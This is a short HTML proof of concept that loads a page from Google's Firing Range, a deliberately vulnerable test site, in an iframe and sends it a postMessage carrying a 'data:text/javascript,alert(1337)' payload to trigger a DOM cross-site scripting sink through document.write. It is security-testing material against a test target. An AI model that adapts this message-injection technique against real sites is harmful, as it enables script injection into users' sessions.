<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>postmessage document.write</title>
</head>
<body>
	<iframe id="test" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite" frameborder="0"></iframe>
	<script>
		const frame = document.querySelector("#test");
		frame.onload = (e) =>
		{
			const payload = {
				url : "data:text/javascript,alert(1337)"
			};
			frame.contentWindow.postMessage(JSON.stringify(payload), "*");
		};
	</script>
</body>
</html>